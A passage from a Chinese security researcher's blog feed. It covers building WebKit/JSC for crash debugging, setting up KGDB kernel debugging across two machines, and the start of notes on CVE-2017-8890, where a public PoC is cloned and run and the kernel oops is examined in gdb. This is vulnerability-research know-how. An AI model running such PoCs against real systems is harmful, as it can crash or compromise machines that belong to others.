            
            <tag> webkit </tag>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>webkit调试方法记录</title>
      <link href="/2018/04/19/js_crash_debug/"/>
      <url>/2018/04/19/js_crash_debug/</url>
      <content type="html"><![CDATA[<h2 id="调试crash的准备工作"><a href="#调试crash的准备工作" class="headerlink" title="调试crash的准备工作"></a>调试crash的准备工作</h2><h3 id="下载-Webkit-源代码并编译"><a href="#下载-Webkit-源代码并编译" class="headerlink" title="下载 Webkit 源代码并编译:"></a>下载 Webkit 源代码并编译:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-&gt; git clone git://git.webkit.org/WebKit.git WebKit</span><br><span class="line"></span><br><span class="line">for macOS:</span><br><span class="line">-&gt; Tools/Scripts/set-webkit-configuration --asan --debug </span><br><span class="line">-&gt; Tools/Scripts/build-webkit</span><br></pre></td></tr></table></figure><p>切换到漏洞影响的分支<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b localname commithash</span><br></pre></td></tr></table></figure></p><p>调试<br>使用的调试器是 lldb. 通过以下命令运行 Safari:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt; Tools/Scripts/run-safari</span><br></pre></td></tr></table></figure></p><p>或者获取源码后直接在xcode里打开webkit，<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-19-162739.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-19-162814.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-19-163348.png" alt=""></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>测试，找一个poc运行，可以看到asna打印uaf。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-19-162506.png" alt=""></p><h2 id="run-jsc"><a href="#run-jsc" class="headerlink" title="run-jsc"></a>run-jsc</h2><p>通过run-jsc这个script我们能打印出JIT的log<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMBP:~/WebKit/Tools/Scripts$ pwd</span><br><span class="line">/Users/sakura/WebKit/Tools/Scripts</span><br><span class="line">sakura@sakuradeMBP:~/WebKit/Tools/Scripts$ ls | grep run-js</span><br><span class="line">run-jsc</span><br><span class="line">sakura@sakuradeMBP:~/WebKit/Tools/Scripts$ ./run-jsc --help</span><br><span class="line">Running 1 time(s): DYLD_FRAMEWORK_PATH=/Users/sakura/WebKit/WebKitBuild/Debug /Users/sakura/WebKit/WebKitBuild/Debug/jsc --help</span><br><span class="line">Usage: jsc [options] [files] [-- arguments]</span><br><span class="line">  -d         Dumps bytecode (debug builds only)</span><br><span class="line">  -e         Evaluate argument as script code</span><br><span class="line">  -f         Specifies a source file (deprecated)</span><br><span class="line">  -h|--help  Prints this help message</span><br><span class="line">  -i         Enables interactive mode (default if no files are specified)</span><br><span class="line">  -m         Execute as a module</span><br><span class="line">  -s         Installs signal handlers that exit on a crash (Unix platforms only)</span><br><span class="line">  -p &lt;file&gt;  Outputs profiling data to a file</span><br><span class="line">  -x         Output exit code before terminating</span><br><span class="line"></span><br><span class="line">  --sample                   Collects and outputs sampling profiler data</span><br><span class="line">  --test262-async            Check that some script calls the print function with the string &apos;Test262:AsyncTestComplete&apos;</span><br><span class="line">  --strict-file=&lt;file&gt;       Parse the given file as if it were in strict mode (this option may be passed more than once)</span><br><span class="line">  --module-file=&lt;file&gt;       Parse and evaluate the given file as module (this option may be passed more than once)</span><br><span class="line">  --exception=&lt;name&gt;         Check the last script exits with an uncaught exception with the specified name</span><br><span class="line">  --watchdog-exception-ok    Uncaught watchdog exceptions exit with success</span><br><span class="line">  --dumpException            Dump uncaught exception text</span><br><span class="line">  --options                  Dumps all JSC VM options and exits</span><br><span class="line">  --dumpOptions              Dumps all non-default JSC VM options before continuing</span><br><span class="line">  --&lt;jsc VM option&gt;=&lt;value&gt;  Sets the specified JSC VM option</span><br><span class="line"></span><br><span class="line">选项描述</span><br><span class="line">JSC_dumpDisassembly = true转储所有JIT编译函数的反汇编。</span><br><span class="line">JSC_dumpDFGDisassembly = true转储DFG和FTL编译函数的反汇编。</span><br><span class="line">JSC_dumpFTLDisassembly = true转储FTL编译函数的反汇编。</span><br><span class="line">JSC_dumpSourceAtDFGTime = true转储DFG/FTL编译函数的来源。</span><br><span class="line">JSC_dumpBytecodeAtDFGTime = true转储DFG/FTL编译函数的字节码。</span><br><span class="line">JSC_dumpGraphAfterParsing = true在DFG/FTL编译时解析函数字节码后转储DFG图。</span><br><span class="line">JSC_dumpGraphAtEachPhase = true在DFG/FTL编译的每个阶段之后转储DFG图。</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line">./run-jsc --dumpGraphAtEachPhase=true /Users/sakura/Desktop/for-in-side-effects.js &amp;&gt; ~/log.txt</span><br><span class="line"></span><br><span class="line">./run-jsc --dumpDisassembly=true /Users/sakura/Desktop/for-in-side-effects.js &amp;&gt; ~/log.txt</span><br></pre></td></tr></table></figure></p><p>for-in-side-effects.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Regression test for bug 179212</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = &#123; <span class="string">"a"</span>: &#123;&#125; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> data = [];</span><br><span class="line"><span class="keyword">var</span> copy = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> z = <span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">    getPrototypeOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">2</span>) &#123;</span><br><span class="line">            data[<span class="number">0</span>] = &#123; <span class="string">"x"</span>: <span class="string">"I changed"</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">1</span>) &#123;</span><br><span class="line">            flag = <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"a"</span>: <span class="number">1</span>, <span class="string">"b"</span>: <span class="number">2</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.__proto__ = z;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    flag = <span class="number">0</span>;</span><br><span class="line">    data = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    copy = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runTest</span>(<span class="params">func</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    reset();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">        func();</span><br><span class="line"></span><br><span class="line">    flag = <span class="number">1</span>;</span><br><span class="line">    func();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy[<span class="number">0</span>].x != <span class="string">"I changed"</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">"Expected updated value for copy[0]"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testWithFTL</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        data[<span class="number">0</span>] = <span class="number">2.2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> d <span class="keyword">in</span> p) &#123;</span><br><span class="line">            copy[<span class="number">0</span>] = data[<span class="number">0</span>];</span><br><span class="line">            copy[<span class="number">1</span>] = data[<span class="number">1</span>];</span><br><span class="line">            copy[<span class="number">2</span>] = data[<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    runTest(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">testWithFTL();</span><br></pre></td></tr></table></figure></p><h2 id="jsc运行报错"><a href="#jsc运行报错" class="headerlink" title="jsc运行报错"></a>jsc运行报错</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-113037.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMBP:~/WebKit/WebKitBuild/Debug$ export DYLD_FRAMEWORK_PATH=~/WebKit/WebKitBuild/Debug</span><br><span class="line">sakura@sakuradeMBP:~/WebKit/WebKitBuild/Debug$ ./jsc</span><br><span class="line">&gt;&gt;&gt; quit()</span><br></pre></td></tr></table></figure></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><a href="https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/" target="_blank" rel="noopener">https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/</a></p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webkit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内核双机调试环境搭建</title>
      <link href="/2018/04/15/kernel_debug/"/>
      <url>/2018/04/15/kernel_debug/</url>
      <content type="html"><![CDATA[<h2 id="选择kernel的版本"><a href="#选择kernel的版本" class="headerlink" title="选择kernel的版本"></a>选择kernel的版本</h2><p>搜索含有dbgsym的内核版本<br><code>apt-cache search linux-image | grep dbgsym | grep 4.11</code><br>搜索特定source code的内核版本<br><code>apt-cache search linux-source</code><br>然后选择一个</p><h2 id="安装内核"><a href="#安装内核" class="headerlink" title="安装内核"></a>安装内核</h2><p>搜索要下载的linux内核版本<br><code>apt-cache search linux-image | grep linux-image | grep generic</code><br>安装内核<br><code>sudo apt-get install linux-image-4.10.0-19-generic</code><br>查看安装的内核版本<br><code>sudo dpkg --list | grep linux-image</code><br>重启，在grub之前，按住shift，选择我们的内核<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-12-162043.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-12-162050.png" alt=""></p><p>验证新内核启用<br><code>uname -sr</code></p><h2 id="安装符号文件"><a href="#安装符号文件" class="headerlink" title="安装符号文件"></a>安装符号文件</h2><p>在终端输入下面的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">codename=$(lsb_release -c | awk  &apos;&#123;print $2&#125;&apos;)</span><br><span class="line">sudo tee /etc/apt/sources.list.d/ddebs.list &lt;&lt; EOF</span><br><span class="line">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;      main restricted universe multiverse</span><br><span class="line">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-security main restricted universe multiverse</span><br><span class="line">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-updates  main restricted universe multiverse</span><br><span class="line">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-proposed main restricted universe multiverse</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></p><p>添加访问符号服务器的密钥文件：<br><code>wget -O - http://ddebs.ubuntu.com/dbgsym-release-key.asc | sudo apt-key add -</code><br>执行<code>sudo apt-get update</code>更新<br>执行如下命令开始下载符号包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-image-`uname -r`-dbgsym</span><br></pre></td></tr></table></figure></p><h2 id="安装kernel对应的源代码"><a href="#安装kernel对应的源代码" class="headerlink" title="安装kernel对应的源代码"></a>安装kernel对应的源代码</h2><p>打开/etc/apt/sources.list，启用deb-src，sudo apt-get update更新<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br><span class="line">去掉下面这句话的注释</span><br><span class="line">deb-src http://us.archive.ubuntu.com/ubuntu/ xenial main restricted</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure></p><ul><li>搜索所有版本的source code:<code>apt-cache search linux-source</code></li><li>安装指定版本的source code:<code>sudo apt-get install linux-source-4.10.0</code></li></ul><p>下载好的源码会被放在/usr/src目录下。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180414/18LAA2CL2i.png?imageslim" alt="mark"><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180414/EjhiGd0J3c.png?imageslim" alt="mark"></p><p>解压缩得到源码<br><code>sudo tar -xvf linux-source-4.10.0.tar.bz2</code></p><p>一切都安装好了之后，就可以拷贝一份我们的虚拟机，一个作为host,一个作为target</p><h2 id="移除打印机，添加串口"><a href="#移除打印机，添加串口" class="headerlink" title="移除打印机，添加串口"></a>移除打印机，添加串口</h2><p>打印机会占用我们的串口</p><h3 id="target"><a href="#target" class="headerlink" title="target"></a>target</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-12-162815.png" alt=""></p><h3 id="host"><a href="#host" class="headerlink" title="host"></a>host</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-12-BF66B78DD197DE00441A9AEB9EAC8BC4.jpg" alt=""></p><h2 id="配置target"><a href="#配置target" class="headerlink" title="配置target"></a>配置target</h2><p>需要让target在开机时候进入kgdb的调试状态，首先需要修改grub文件，增加grub引导时候的菜单项。</p><p><code>sudo vim /etc/grub.d/40_custom</code><br>修改的内容从/boot/grub/grub.cfg里复制，复制一个菜单项（menuentry）过来，再把菜单名中增加调试信息，然后在内核命令行中增加KGDB选项，即下面这样：<br><strong>新增部分：kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon nokaslr</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">exec tail -n +3 $0</span><br><span class="line"># This file provides an easy way to add custom menu entries.  Simply type the</span><br><span class="line"># menu entries you want to add after this comment.  Be careful not to change</span><br><span class="line"># the &apos;exec tail&apos; line above.</span><br><span class="line">menuentry &apos;Ubuntu,KGDB with nokaslr&apos; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option &apos;gnulinux-4.10.0-19-generic-advanced-32ee8e9c-31e6-494c-a9ea-1a416cbfeca7&apos; &#123;</span><br><span class="line">                recordfail</span><br><span class="line">                load_video</span><br><span class="line">                gfxmode $linux_gfx_mode</span><br><span class="line">                insmod gzio</span><br><span class="line">                if [ x$grub_platform = xxen ]; then insmod xzio; insmod lzopio; fi</span><br><span class="line">                insmod part_msdos</span><br><span class="line">                insmod ext2</span><br><span class="line">                set root=&apos;hd0,msdos1&apos;</span><br><span class="line">                if [ x$feature_platform_search_hint = xy ]; then</span><br><span class="line">                  search --no-floppy --fs-uuid --set=root --hint-bios=hd0,msdos1 --hint-efi=hd0,msdos1 --hint-baremetal=ahci0,msdos1  32ee8e9c-31e6-494c-a9ea-1a416cbfeca7</span><br><span class="line">                else</span><br><span class="line">                  search --no-floppy --fs-uuid --set=root 32ee8e9c-31e6-494c-a9ea-1a416cbfeca7</span><br><span class="line">                fi</span><br><span class="line">                echo    &apos;Ubuntu,KGDB with nokaslr ...&apos;</span><br><span class="line">                linux   /boot/vmlinuz-4.10.0-19-generic root=UUID=32ee8e9c-31e6-494c-a9ea-1a416cbfeca7 ro find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US quiet kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon nokaslr</span><br><span class="line">                echo    &apos;Loading initial ramdisk ...&apos;</span><br><span class="line">                initrd  /boot/initrd.img-4.10.0-19-generic</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>修改grub的配置后，需要执行sudo update-grub来更新。更新后目标机器就准备好了。<br>重启按住shift,进入刚才添加的menu即可进入到被调试状态。</p><h2 id="配置host"><a href="#配置host" class="headerlink" title="配置host"></a>配置host</h2><p>设置串口通信的波特率<br><code>sudo stty -F /dev/ttyS0 115200</code><br>要查看是否设置成功<br><code>sudo stty -F /dev/ttyS0</code><br>注意这个每次host重启都要再输入一遍，嗯，写个shell吧。</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>编写config，用source加载（直接在gdb里输入也可）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set architecture i386:x86-64:intel</span><br><span class="line">target remote /dev/ttyS0</span><br></pre></td></tr></table></figure></p><p>使用gdb来调试带符号的vmlinux</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb -s /usr/lib/debug/boot/vmlinux-4.10.0-19-generic</span><br><span class="line">gdb &gt; source config</span><br></pre></td></tr></table></figure><p>符号加载完成，bt查看当前栈帧，c运行内核。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-12-162731.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-12-162722.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-12-162712.png" alt=""></p><h2 id="查看源码遇到的问题"><a href="#查看源码遇到的问题" class="headerlink" title="查看源码遇到的问题"></a>查看源码遇到的问题</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180414/B2ildJ3Bid.png?imageslim" alt="mark"></p><p>可以看到，list本来应该显示具体的源码，但是这里只是打印出了它所在的文件，这是因为在这个路径下没有源码。<br>所以说我们就建立这个路径，然后把源码放进去</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180414/3DGa0AdAEh.png?imageslim" alt="mark"><br>然后dir设置好目录<br><code>dir /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0</code><br>现在就可以查看源码了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180414/J3IJ1i0jE3.png?imageslim" alt="mark"></p><h2 id="单步调试"><a href="#单步调试" class="headerlink" title="单步调试"></a>单步调试</h2><p>我从头开始说：</p><ul><li>host<br>target remote /dev/ttyS0<br>按c继续运行target</li><li>target<br>一开始停在下图这个地方，host按c之后，target继续运行进入系统<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-12-162722.png" alt=""><br>然后输入<code>sudo su &amp;&amp; echo g &gt; &quot;/proc/sysrq-trigger&quot;</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-15-060050.png" alt=""><br>这时候target应该进入假死状态，其实就是完全动不了。<br>这一步就是打开target的kgdb调试。</li><li>host<br>这时候host那里不再是<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-15-060210.png" alt=""><br>而是停下来了，可以下断了<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-15-060229.jpg" alt=""><br>在你想要调试的函数下断点，然后按c，恢复target执行。</li><li>target<br>这样就可以运行我们的poc了<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-15-060338.jpg" alt=""></li><li>host<br>回到host，此时应该已经停在断点了，然后按n可以单步调试。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-15-060453.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-15-060502.jpg" alt=""></li></ul><p>至此，内核调试的整个配置和调试方法都写完了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://advdbg.org/blogs/advdbg_system/search.aspx?q=%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95&amp;p=1" target="_blank" rel="noopener">ubuntu内核调试要点</a></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>内核调试的坑实在太深，一开始参考了muhe师傅的文章用gdb+qemu调，然后编译了kernel 4.x之后，编译不报错，但是调试过程简直了，gdb花式挂不上去，看网上说某些版本要改gdb源码重新编译gdb……放弃了放弃了。<br>感谢教我搭建双机调试的师傅……<br>内核还是很容易调飞的，有时候花式加载不出来。</p><p>另外如果下载符号文件太慢，可以参考我的这篇文章，在虚拟机里用ss代理。<br><a href="http://eternalsakura13.com/2018/02/02/proxy/">http://eternalsakura13.com/2018/02/02/proxy/</a></p>]]></content>
      
      <categories>
          
          <category> kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2017-8890调试笔记</title>
      <link href="/2018/04/14/cve-2017-8890/"/>
      <url>/2018/04/14/cve-2017-8890/</url>
      <content type="html"><![CDATA[<h2 id="poc运行"><a href="#poc运行" class="headerlink" title="poc运行"></a>poc运行</h2><p>在github找了一个<a href="https://github.com/beraphin/CVE-2017-8890/blob/master/poc.cpp" target="_blank" rel="noopener">poc</a><br>在target里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/beraphin/CVE-2017-8890.git</span><br><span class="line">g++ -pthread -o poc poc.cpp</span><br></pre></td></tr></table></figure></p><p>target里<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180414/CcbA2dDhba.png?imageslim" alt="mark"><br>然后回到host发现已经断下了（panic)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">[   41.176158] sd 2:0:0:0: [sda] Assuming drive cache: write through</span><br><span class="line">[  121.392169] BUG: unable to handle kernel NULL pointer dereference at 0000000000000006</span><br><span class="line">[  121.417112] IP: ip_mc_leave_src+0x25/0x90</span><br><span class="line">[  121.433182] PGD 1e957067 </span><br><span class="line">[  121.433184] PUD 1bc25067 </span><br><span class="line">[  121.446277] PMD 0 </span><br><span class="line">[  121.462184] </span><br><span class="line">[  121.490174] Oops: 0000 [#1] SMP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">──────────────────────────────────────────────────[ code:i386:x86-64:intel ]────</span><br><span class="line">   0xffffffff8182f49d &lt;ip_mc_leave_src+29&gt; test   rbx, rbx</span><br><span class="line">   0xffffffff8182f4a0 &lt;ip_mc_leave_src+32&gt; je     0xffffffff8182f4ef &lt;ip_mc_leave_src+111&gt;</span><br><span class="line">   0xffffffff8182f4a2 &lt;ip_mc_leave_src+34&gt; mov    edx, DWORD PTR [rsi+0x14]</span><br><span class="line">   0xffffffff8182f4a5 &lt;ip_mc_leave_src+37&gt; mov    ecx, DWORD PTR [rbx+0x4]</span><br><span class="line">   0xffffffff8182f4a8 &lt;ip_mc_leave_src+40&gt; lea    rsi, [rsi+0x8]</span><br><span class="line">   0xffffffff8182f4ac &lt;ip_mc_leave_src+44&gt; lea    r8, [rbx+0x18]</span><br><span class="line">   0xffffffff8182f4b0 &lt;ip_mc_leave_src+48&gt; xor    r9d, r9d</span><br><span class="line">   0xffffffff8182f4b3 &lt;ip_mc_leave_src+51&gt; call   0xffffffff8182f110 &lt;ip_mc_del_src&gt;</span><br><span class="line">   0xffffffff8182f4b8 &lt;ip_mc_leave_src+56&gt; mov    QWORD PTR [r12+0x18], 0x0</span><br><span class="line">[!] Command &apos;context&apos; failed to execute properly, reason: Sign not allowed in string format specifier</span><br><span class="line">gef➤  bt</span><br><span class="line">#0  0xffffffff8182f4a5 in 